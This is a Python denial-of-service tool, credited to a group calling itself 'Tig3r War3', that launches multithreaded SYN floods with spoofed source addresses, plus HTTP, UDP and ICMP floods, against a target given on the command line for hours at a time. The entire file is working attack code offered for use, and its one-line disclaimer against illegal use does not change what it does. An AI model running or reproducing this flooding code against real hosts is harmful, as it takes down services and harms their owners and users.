#This Tool Make BY Tig3r Mat3 Junior
#Don't Use This Tool Any Illigel Activity
#Don't Copy This Script Without Permission
#Team - Tig3r War3

import socket
import random
import threading
import time
import sys
import logging
import requests
import argparse
from struct import pack
from http.server import HTTPServer, BaseHTTPRequestHandler

# ANSI escape codes for neon-like colors
neon_cyan = "\033[1;36m"
neon_magenta = "\033[1;35m"
neon_blue = "\033[1;34m"
reset_color = "\033[0m"

# ASCII Art with Neon Effect
ascii_art = [
    neon_cyan + "  _____ _               __      __             " + reset_color,
    neon_magenta + " |_   _(_)__ _ ___ _ _  \ \    / /__ _ _ _ __  " + reset_color,
    neon_blue + "   | | | / _` / -_) '_|  \ \/\/ / _ \ '_| '  \ " + reset_color,
    neon_cyan + "   |_| |_\__, \___|_|     \_/\_/\___/_| |_|_|_|" + reset_color,
    neon_magenta + "         |___/                                 " + reset_color,
]

# Print the ASCII art with neon effect
for line in ascii_art:
    print(line)

# Setup logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger()

# Checksum calculation for TCP packets
def checksum(msg):
    s = 0
    for i in range(0, len(msg), 2):
        w = (msg[i] << 8) + (msg[i + 1])
        s = s + w
    s = (s >> 16) + (s & 0xffff)
    s = s + (s >> 16)
    return ~s & 0xffff

# IP Header creation
def create_ip_header(src_ip, dst_ip):
    ip_ihl = 5
    ip_ver = 4
    ip_tos = 0
    ip_tot_len = 20 + 20
    ip_id = random.randint(1, 65535)
    ip_frag_off = 0
    ip_ttl = 255
    ip_proto = socket.IPPROTO_TCP
    ip_check = 0
    ip_saddr = socket.inet_aton(src_ip)
    ip_daddr = socket.inet_aton(dst_ip)
    ip_ihl_ver = (ip_ver << 4) + ip_ihl
    return pack('!BBHHHBBH4s4s', ip_ihl_ver, ip_tos, ip_tot_len, ip_id, ip_frag_off, ip_ttl, ip_proto, ip_check, ip_saddr, ip_daddr)

# TCP Header creation
def create_tcp_header(src_ip, dst_ip, dst_port):
    src_port = random.randint(1024, 65535)
    seq = random.randint(0, 4294967295)
    ack_seq = 0
    doff = 5
    tcp_flags = 2  # SYN flag
    tcp_window = socket.htons(5840)
    tcp_check = 0
    tcp_urg_ptr = 0
    tcp_header = pack('!HHLLBBHHH', src_port, dst_port, seq, ack_seq, doff << 4, tcp_flags, tcp_window, tcp_check, tcp_urg_ptr)
    pseudo_header = pack('!4s4sBBH', socket.inet_aton(src_ip), socket.inet_aton(dst_ip), 0, socket.IPPROTO_TCP, len(tcp_header))
    tcp_check = checksum(pseudo_header + tcp_header)
    return pack('!HHLLBBHHH', src_port, dst_port, seq, ack_seq, doff << 4, tcp_flags, tcp_window, tcp_check, tcp_urg_ptr)

# Function for SYN flood
def syn_flood(target_ip, target_port, duration):
    src_ip = "192.168.0.1"  # Fake source IP
    timeout = time.time() + duration
    while time.time() < timeout:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            ip_header = create_ip_header(src_ip, target_ip)
            tcp_header = create_tcp_header(src_ip, target_ip, target_port)
            packet = ip_header + tcp_header
            s.sendto(packet, (target_ip, target_port))
            logger.info(neon_blue + f"SYN flood packet sent to {target_ip}:{target_port}" + reset_color)
        except Exception as e:
            logger.error(f"Error: {e}")
        finally:
            s.close()

# Function for HTTP flood
def http_flood(target_url, duration):
    timeout = time.time() + duration
    while time.time() < timeout:
        try:
            response = requests.get(target_url)
            logger.info(neon_cyan + f"Flooding {target_url} - Status Code: {response.status_code}" + reset_color)
        except requests.RequestException as e:
            logger.error(f"Request failed: {e}")

# Function for UDP flood
def udp_flood(target_ip, target_port, duration):
    timeout = time.time() + duration
    while time.time() < timeout:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            message = random._urandom(1024)  # Random payload
            s.sendto(message, (target_ip, target_port))
            logger.info(neon_magenta + f"UDP flood message sent to {target_ip}:{target_port}" + reset_color)
        except Exception as e:
            logger.error(f"Error: {e}")
        finally:
            s.close()

# Function for ICMP flood
def icmp_flood(target_ip, duration):
    icmp_type = 8  # Echo request
    icmp_code = 0
    timeout = time.time() + duration
    while time.time() < timeout:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            packet_id = random.randint(1, 65535)
            sequence = random.randint(1, 65535)
            checksum_value = 0
            icmp_header = pack('!BBHHH', icmp_type, icmp_code, checksum_value, packet_id, sequence)
            s.sendto(icmp_header, (target_ip, 0))
            logger.info(neon_blue + f"ICMP flood packet sent to {target_ip}" + reset_color)
        except Exception as e:
            logger.error(f"Error: {e}")
        finally:
            s.close()

# Function to start multiple threads for flood attacks
def start_flood_attack(target_url, target_ip, target_port, flood_type, threads, duration):
    if flood_type == 'http':
        for _ in range(threads):
            thread = threading.Thread(target=http_flood, args=(target_url, duration))
            thread.start()
    elif flood_type == 'syn':
        for _ in range(threads):
            thread = threading.Thread(target=syn_flood, args=(target_ip, target_port, duration))
            thread.start()
    elif flood_type == 'udp':
        for _ in range(threads):
            thread = threading.Thread(target=udp_flood, args=(target_ip, target_port, duration))
            thread.start()
    elif flood_type == 'icmp':
        for _ in range(threads):
            thread = threading.Thread(target=icmp_flood, args=(target_ip, duration))
            thread.start()
    else:
        logger.error("Invalid flood type")

# HTTP server for demonstration purposes
class FloodHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(b"Flood server response")

def run_server(port):
    server_address = ('', port)
    httpd = HTTPServer(server_address, FloodHandler)
    logger.info(neon_cyan + f"Starting flood server on port {port}" + reset_color)
    httpd.serve_forever()

# Command-line interface using argparse
def main():
    parser = argparse.ArgumentParser(description="Flood attack script")
    parser.add_argument("-s", "--server", dest="server", required=True, help="Target URL or IP")
    parser.add_argument("-p", "--port", dest="port", type=int, default=80, help="Target port (default: 80)")
    parser.add_argument("-t", "--threads", dest="threads", type=int, default=10, help="Number of threads (default: 10)")
    parser.add_argument("-d", "--duration", dest="duration", type=int, default=1, help="Duration in hours (default: 1)")
    parser.add_argument("-f", "--flood_type", dest="flood_type", choices=['http', 'syn', 'udp', 'icmp'], required=True, help="Type of flood: 'http', 'syn', 'udp', or 'icmp'")
    
    args = parser.parse_args()

    target_url = f"http://{args.server}:{args.port}"
    target_ip = args.server
    target_port = args.port
    threads = args.threads
    duration = args.duration * 3600  # Convert hours to seconds

         # Log the start of the flood attack with colored output
    logger.info(neon_magenta + f"Starting {args.flood_type} flood attack on {target_url} with {threads} threads for {args.duration} hour(s)." + reset_color)

    # Start the flood attack
    start_flood_attack(target_url, target_ip, target_port, args.flood_type, threads, duration)

# Run the main function if this script is executed directly
if __name__ == '__main__':
    main()

#BANGLADESH
